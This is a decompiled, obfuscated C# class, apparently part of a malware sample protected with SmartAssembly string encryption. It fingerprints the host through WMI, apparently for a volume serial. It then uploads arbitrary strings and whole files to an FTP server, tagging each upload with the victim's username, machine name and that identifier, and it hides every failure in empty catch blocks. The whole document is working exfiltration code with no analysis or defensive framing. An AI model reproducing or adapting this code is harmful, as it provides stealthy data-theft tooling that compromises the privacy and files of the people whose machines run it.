using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eMvPcEiNWKRwo;

internal sealed class HSDASSgFriA
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string KzNxlIVvXTMnYo()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107408864));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107408843)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107408794);
			ManagementObject val3 = new ManagementObject(getString_0(107408789) + text2 + getString_0(107408268));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107408263)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107394337) : text;
		}
	}

	public static void VTFfNHKtSAEf(string XXkRNQkpnvx = "URL", string xXbezvFxodVTIn = "USERNAME", string KVHaBvDThH = "ACCESO", string ficpBoziyZpuB = "")
	{
		try
		{
			string text = KzNxlIVvXTMnYo();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(XXkRNQkpnvx + getString_0(107409938) + Environment.UserName + getString_0(107409957) + Environment.MachineName + getString_0(107409904) + text + getString_0(107409931));
			ftpWebRequest.Method = getString_0(107408238);
			ftpWebRequest.Credentials = new NetworkCredential(xXbezvFxodVTIn, KVHaBvDThH);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(ficpBoziyZpuB);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void qlPqGmOVoBTz(string VuvjcwLNMDRo = "URL", string NMJyUyWvoKzGMtTSZ = "USERNAME", string HxUbFnMvBlPMsbD = "ACCESO", string wCZONeiiknxVe = "")
	{
		try
		{
			string text = KzNxlIVvXTMnYo();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(VuvjcwLNMDRo + getString_0(107409938) + Environment.UserName + getString_0(107409957) + Environment.MachineName + getString_0(107409904) + text + getString_0(107409904) + Path.GetFileName(wCZONeiiknxVe));
			ftpWebRequest.Method = getString_0(107408238);
			ftpWebRequest.Credentials = new NetworkCredential(NMJyUyWvoKzGMtTSZ, HxUbFnMvBlPMsbD);
			byte[] array = File.ReadAllBytes(wCZONeiiknxVe);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static HSDASSgFriA()
	{
		Strings.CreateGetStringDelegate(typeof(HSDASSgFriA));
	}
}
